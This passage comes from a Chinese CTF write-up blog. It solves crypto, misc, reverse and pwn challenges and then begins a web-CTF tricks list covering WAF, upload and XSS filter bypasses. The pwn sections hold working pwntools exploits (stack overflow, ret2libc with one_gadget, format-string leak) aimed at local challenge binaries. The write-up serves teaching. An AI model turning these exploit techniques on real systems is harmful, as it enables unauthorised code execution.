漏洞之一</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD7on.png" alt="1RD7on.png"></p><p>根据提示，flag放在/flag里面，我们读取一下：</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDjQU.png" alt="1RDjQU.png"></p><p>然后就得到flag了</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDvyF.png" alt="1RDvyF.png"></p><p><img src="https://s2.ax1x.com/2020/02/08/1RH0lF.png" alt="1RH0lF.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>这次的密码学题目主要目的就是把一些奇淫技巧都让新人见识一下，因此抽取了一些比较无脑的题目，直接在线跑就可以。</p><h3 id="你是猪吗"><a href="#你是猪吗" class="headerlink" title="你是猪吗"></a>你是猪吗</h3><p>题目说得很明显了，跟猪有关，不难想到是猪圈密码，百度找到猪圈密码，对应把 flag 拼出来就可以，这里 flag 设置了大小写不敏感，也算是降低了难度，送分题。</p><p><a href="https://en.wikipedia.org/wiki/Pigpen_cipher" target="_blank" rel="noopener">参考资料：维基百科-Pigpen_cipher</a></p><p><img src="https://s2.ax1x.com/2020/02/08/1RDnP0.png" alt="1RDnP0.png"></p><h3 id="knock-knock"><a href="#knock-knock" class="headerlink" title="knock knock"></a>knock knock</h3><p>摩斯电码，没有什么技术含量，也是调查问卷评为无聊的一题了，直接百度Google一把梭找到链接直接转换，题目提示了 flag 为有意义小写字母及数字，所以要是转成大写的得自己转成小写，送分题。</p><h3 id="F-k-your-brain"><a href="#F-k-your-brain" class="headerlink" title="F**k your brain"></a>F**k your brain</h3><p>brainfuck 编码，也是Google一下就找到在线网站，直接解编码就可以，主要是需要认得出来和学会根据题目等信息去寻找信息，送分题。</p><h3 id="look-at-your-keyboard"><a href="#look-at-your-keyboard" class="headerlink" title="look at your keyboard"></a>look at your keyboard</h3><p>关键词 keyboard，那就看键盘，可以看到每一个以空格分隔的字符串，在键盘上刚好圈出一个字母，加上格式 wctf{} 即可，送分题。</p><h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p>根据题目不难想到是base编码的变种，并且table都已经给出来了，不懂的可以参考<a href="https://en.wikipedia.org/wiki/Base64" target="_blank" rel="noopener">维基百科-base64</a>，题目只是把表换了一下，并且这种题可以先根据表把给出的编码字母替换掉，再进行正常的 base64 解码，这样操作就比较简单。</p><p>手动也能做，这里贴一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">string1 = <span class="string">"wctfEFGHIOPQJKLMNRSTUVklmWXYZabBdeDghijnop45678qrsCuvAxyz01239+/"</span></span><br><span class="line">string2 = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">base = <span class="string">b'axKvWn7DmlKiKgRBJlKBWnV8BN=='</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> base:</span><br><span class="line"><span class="keyword">if</span> chr(i) != <span class="string">'='</span>:</span><br><span class="line">index = string1.find(chr(i))</span><br><span class="line">flag += string2[index]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag += <span class="string">'='</span></span><br><span class="line">print(flag)</span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d2N0ZntiYXNlNjRfMXNfZnVufQ==</span><br><span class="line">b'wctf&#123;base64_1s_fun&#125;'</span><br><span class="line">[Finished in 0.1s]</span><br></pre></td></tr></table></figure><p>密码学题都是送分题，这里不多说。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="武汉加油-中国加油"><a href="#武汉加油-中国加油" class="headerlink" title="武汉加油 中国加油"></a>武汉加油 中国加油</h3><p>签到题，把 flag 复制就可以，送分题。</p><h3 id="Different"><a href="#Different" class="headerlink" title="Different"></a>Different</h3><p>题目说了 Different，那就是找不同，一般是比对十六进制数据，用 Beyond Compare 打开对比，标红差别就行，送分题。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDUG6.png" alt="1RDUG6.png"></p><h3 id="You-are-a-good-man"><a href="#You-are-a-good-man" class="headerlink" title="You are a good man"></a>You are a good man</h3><p>题目信息写了180cm，然后放出hint说很高，那直接把解题思路都说清楚了：改图片高度。我们先右键查看一下它的尺寸</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDDqH.png" alt="1RDDqH.png"></p><p>1125，我们用程序员计算器（Windows自带）将十六进制数计算出来，为 465。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD6II.png" alt="1RD6II.png"></p><p>然后用 Winhex 打开(其它十六进制编辑器也可以，如010 Editor等)，寻找 04 65的关键字样，注意第二个才是高，将他改高一点即可，如改成1400，转换成十六进制就是 578，即05 78，修改后保存即可（预期解是1313）。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDgit.png" alt="1RDgit.png"></p><p>​    </p><p>这是原图</p><p><img src="https://s2.ax1x.com/2020/02/08/1RHDOJ.jpg" alt="1RHDOJ.jpg"></p><h3 id="Guess-Where-I-am"><a href="#Guess-Where-I-am" class="headerlink" title="Guess Where I am"></a>Guess Where I am</h3><p>这题灵感来自 C1CTF 的，也算是借鉴了，图片找了一个比较哲学的，虽然跟题目没有任何关系，题目表述为<code>Shakespeare will figure out you should take a guess</code>，一个 <code>out</code> 一个 <code>guess</code>，提示已经很明确是使用工具 <code>outguess</code>了，选择这个出题思路也是发现学校好像没什么接触过这个工具，刚好可以借机让大家知道一下。</p><p>安装工具自行Google即可，不做阐述，工具有了，这题也就是送分题了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用命令</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> outguess -r guess.jpg flag</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> cat flag | base64 -d</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里提取出来的数据是base64编码过，因此需要再解码一下</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/08/1RDoZj.png" alt="1RDoZj.png"></p><h3 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h3><p>我是做梦没想到这个可以难到一些人，直接填写调查问卷即可拿flag，顺便拿点反馈做个统计，以后好改进，毕竟是Google表单，因此需要挂个梯子，题目也说明了需要科学上网，填好之后就送flag了，送分题。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDTds.png" alt="1RDTds.png"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h3><p>在学校主站上也放过，原题，也是bugku中最简单的逆向题，题目也提示了 <code>IDA is a good tool</code>，我们直接拖进 IDA，就可以看到一串比较明显的东西。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDxL4.png" alt="1RDxL4.png"></p><p>最简单的方法，手动按<code>r</code>，用眼睛看，flag就有了，主要是让大家把IDA装好并简单使用。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RHBy4.png" alt="1RHBy4.png"></p><h3 id="junkcode"><a href="#junkcode" class="headerlink" title="junkcode"></a>junkcode</h3><p><img src="https://s2.ax1x.com/2020/02/08/1W9Lh4.png" alt="1W9Lh4.png"></p><p>直接看到我们程序调用的这个地方会发现地址是红色的，没有识别成一个函数，主要是因为IDA是使用的线性扫描法，碰到花指令时就会出现如上情况，这种比较小程序的可以手动去花指令</p><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9j39.png" alt="1W9j39.png"></p><p>如果我们直接在开始处强行Create function，IDA会报如下错误<code>undefined instruction</code>在<code>text:00000000004007A3</code>，过去看一下</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9vcR.png" alt="1W9vcR.png"></p><p>很明显中间有一个Byte的指令根本没有用到，我们把它nop（机器码0x90，代表什么也不做）掉</p><p>可以Ctrl+Alt+K使用keypatch，也可以到HEX里面找到对应位置按F2修改成90，效果如下：</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9xj1.png" alt="1W9xj1.png"></p><p>然后在此处按C把数据转成指令</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCSnx.png" alt="1WCSnx.png"></p><p>再回来create就发现能成功了：</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCpB6.png" alt="1WCpB6.png"></p><h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>但是无法f5，会显示</p><p><img src="https://s2.ax1x.com/2020/02/08/1WC9HK.png" alt="1WC9HK.png"></p><p>是因为这里还有一个花指令</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCPAO.png" alt="1WCPAO.png"></p><p>这个add rsp,64h显然没有任何作用，可是这种指令会干扰IDA分析函数，add rsp一般只出现在函数调用后用来释放参数空间和对齐，直接nop掉这条指令再f5</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCiND.png" alt="1WCiND.png"></p><p>接下来就是正常的程序分析了</p><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>按 r 将 <code>dest</code> 转成字符形式</p><p><img src="https://s2.ax1x.com/2020/02/09/1fIFU0.png" alt="1fIFU0.png"></p><p>我们跟踪 <code>src</code> 看到为<code>k^a3``7z</code></p><p><img src="https://s2.ax1x.com/2020/02/09/1fIiEq.png" alt="1fIiEq.png"></p><p>写脚本计算出来就可以了，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line">str = <span class="string">b'wdviO&#123;Uk^a3``7z'</span></span><br><span class="line">flag1 = <span class="string">''</span></span><br><span class="line">flag2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">flag1 += chr(str[i] - i)</span><br><span class="line">flag2 += chr(str[i+<span class="number">8</span>] ^ i)</span><br><span class="line">flag = flag1 + flag2</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ python exp.py</span><br><span class="line">wctf&#123;JuNk_c0de1&#125;</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>一个基础栈溢出</p><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9TBV.png" alt="1W9TBV.png"></p><p>这个题本身没有开保护，旨在想让你们先了解一下什么是栈溢出</p><p><img src="https://s2.ax1x.com/2020/02/08/1W977T.png" alt="1W977T.png"></p><p>首先打印了一个函数地址</p><p>对应的函数如下：</p><p><img src="https://s2.ax1x.com/2020/02/08/1W94cn.png" alt="1W94cn.png"></p><p>然后write出提示之后通过gets输入造成栈溢出，这里的<code>gets(&amp;v5,&quot;&gt;&quot;)</code>带着一个<code>&quot;&gt;&quot;</code>主要是ida识别的时候会有些问题，这个<code>&quot;&gt;&quot;</code>字符串的地址本来是前一个<code>write</code>函数的第二个参数，这里识别出错就成了gets带着两个参数</p><h4 id="计算偏移量"><a href="#计算偏移量" class="headerlink" title="计算偏移量"></a>计算偏移量</h4><p>既然知道是栈溢出了，首先就要计算偏移量，v5从<code>[rbp-40h]</code>的地方开始，然后<code>[rbp]</code>处还有8个字节，所以构造的payload就应该是’a’*0x40+’b’*0x8+p64(想要劫持到的函数地址)，实现程序流劫持</p><h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><p>具体exp如下(因为我写exp的时候都是用的一个Demo.py，所以具体的实现过程只用看<code># todo here</code>即可，这里只有两行)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./warmup'</span><span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x40</span>+<span class="string">'b'</span>*<span class="number">0x8</span>+p64(<span class="number">0x40060d</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>后面的题就是想拿给18级做的了，19级能搭起前面这个题的环境还有成功复现就很不错了XD</p><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W95Xq.png" alt="1W95Xq.png"></p><p>开启栈不可执行，没有canary、PIE</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9h1s.png" alt="1W9h1s.png"></p><p>先输入到<code>buf 0xA</code>字节，然后<code>read(0,&amp;s1,0x100)</code>一个很明显的栈溢出，后面的ok和fail没什么用</p><p>由于只有一次溢出，程序也没有后门，所以我们需要先leak出一个libc的地址，然后漏洞点重复利用，回到main，然后ret2libc</p><h4 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h4><p>先用<code>ROPgadget</code>寻找<code>gadget：pop rdi ret</code></p><p>然后第一次的payload：<code>payload=&#39;a&#39;*0x20+&#39;b&#39;*8+p64(prdi_ret)+p64(puts_GOT)+p64(puts_plt)+p64(main)</code></p><p>利用<code>puts_plt</code>把<code>puts</code>函数的GOT表项打出来，然后回到main</p><p>第二次根据puts函数的地址和固定偏移计算出<code>libc</code>的加载地址，至于这些偏移可以在脚本里面写<code>symbols[&#39;puts&#39;]</code>也可以直接用<code>gdb</code>调试时 ：p puts然后<code>vmmap</code>查看基址，相减得到偏移</p><h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><p>得到基址之后使用one_gadget，满足限制条件即可，或者利用libc里面的<code>/bin/sh</code>地址，调用<code>system</code>也行（个人推荐用one_gadget，方便很多）</p><p>第二次的payload：<code>payload=&#39;a&#39;*0x20+&#39;b&#39;*8+p64(libc_base+one_gadget_offset)</code></p><h4 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./pwn1'</span>      <span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary         <span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)    <span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line">p.recvuntil(<span class="string">'your name\n'</span>)</span><br><span class="line">p.send(<span class="string">'Coldshield'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'the key?\n'</span>)</span><br><span class="line"></span><br><span class="line">prdi_ret=<span class="number">0x00000000004012ab</span></span><br><span class="line">puts_GOT=<span class="number">0x404018</span></span><br><span class="line">puts_plt=<span class="number">0x401030</span></span><br><span class="line">main=<span class="number">0x401162</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x20</span>+<span class="string">'b'</span>*<span class="number">8</span>+p64(prdi_ret)+p64(puts_GOT)+p64(puts_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_offset=<span class="number">0x6f690</span></span><br><span class="line">one_gadget_offset=<span class="number">0x45216</span></span><br><span class="line">p.recvuntil(<span class="string">'fail!\n'</span>)</span><br><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))-puts_offset</span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'libc_base:'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'your name\n'</span>)</span><br><span class="line">p.send(<span class="string">'Coldshield'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'the key?\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x20</span>+<span class="string">'b'</span>*<span class="number">8</span>+p64(libc_base+one_gadget_offset)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="rand"><a href="#rand" class="headerlink" title="rand"></a>rand</h3><p>这个题是我出的一个题，具体结合了格式化字符串还有栈上变量的覆盖</p><h4 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9bAU.png" alt="1W9bAU.png"></p><p>没有canary和PIE</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9qNF.png" alt="1W9qNF.png"></p><p><code>read(0,&amp;buf,0x30)</code>很明显能溢出到<code>seed</code>，覆盖其为我们控制的值就可以预测rand()产生的值</p><p>通过随机数检测之后，下面有一个格式化字符串漏洞，是将我们前面用来覆盖<code>seed</code>输入的name打印出来，直接打印栈上任何存在的一个<code>libc</code>地址即可（可以直接看有没有哪个值是属于<code>libc</code>的），但是其中main函数的返回地址固定是<code>___libc_start_main</code>中的偏移，具体见我之前暑假写的ELF执行全流程，所以计算出调用<code>printf</code>时这个返回地址的偏移即可</p><p>payload1(name)：<code>p.send(&#39;%19$p&#39;.ljust(0x28,&#39;a&#39;)+p64(0))</code></p><p>最后一个say something只能使用<code>one_gadget</code>，因为溢出字节只到了返回地址</p><p>payload2：<code>payload=&#39;\x00&#39;*0x50+&#39;b&#39;*8+p64(libc_base+0x45216)</code></p><h4 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./rand'</span><span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line">lib = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">lib.srand(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x40081C")</span></span><br><span class="line">p.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'%19$p'</span>.ljust(<span class="number">0x28</span>,<span class="string">'a'</span>)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'rand game\n'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">num=lib.rand() % <span class="number">999</span></span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Win\n'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your name is:\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_base=int(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="number">-0x20830</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">0x50</span>+<span class="string">'b'</span>*<span class="number">8</span>+p64(libc_base+<span class="number">0x45216</span>)</span><br><span class="line">p.recvuntil(<span class="string">'something?\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p><code>suctf playfmt</code>原题，可以自己上网找找wp，至于<code>fopen</code>之后为什么能够这样修改偏移可以改到对应的flag地址，可以了解一下IO file，不过比赛时这种偏移可以直接调试看就好了</p><p>参考：<a href="https://cloud.tencent.com/developer/article/1492955" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1492955</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web In CTF</title>
      <link href="2019/07/14/Web-In-CTF/"/>
      <url>2019/07/14/Web-In-CTF/</url>
      
        <content type="html"><![CDATA[<p>Web tutorial by WUST-AIS</p><a id="more"></a><h2 id="常见套路"><a href="#常见套路" class="headerlink" title="常见套路"></a>常见套路</h2><ul><li>爆破，包括<code>md5</code>、爆破随机数、验证码识别等</li><li>绕<code>WAF</code>，包括花式绕<code>Mysql</code>、绕文件读取关键词检测之类拦截</li><li>花式玩弄几个PHP特性，包括弱类型，<code>strpos</code>和<code>===</code>，反序列化 <code>destruct</code>、<code>\0</code>截断</li><li>各种找源码技巧，包括<code>git</code>、<code>svn</code>、<code>xxx.php.swp</code>、<code>*www*.(zip|tar.gz|rar|7z)</code>、<code>xxx.php.bak</code></li><li>文件上传，包括花式文件后缀 <code>.php345</code> ，<code>.inc</code>， <code>.phtml</code>， <code>.phpt</code>， <code>.phps</code>、各种文件内容检测<code>&lt;?php</code>, <code>&lt;?</code>,  <code>&lt;%</code>,  <code>&lt;script language=php&gt;</code>、花式解析漏洞</li><li><code>Mysql</code>类型差异，包括和PHP弱类型类似的特性，<code>0x</code>、<code>0b</code>、<code>1e</code>之类，<code>varchar</code>和<code>integer</code>相互转换</li><li><code>open_basedir</code>、<code>disable_functions</code>花式绕过技巧，包括<code>dl</code>、<code>mail</code>、<code>imagick</code>、<code>bash</code>漏洞、<code>DirectoryIterator</code>及各种二进制选手插足的方法</li><li>社工，包括花式查社工库、微博、QQ签名、<code>whois</code></li><li><code>windows</code>特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、<code>::$DATA</code>，冒号截断</li><li>XSS，各种浏览器<code>auditor</code>绕过、富文本过滤黑白名单绕过、<code>flash 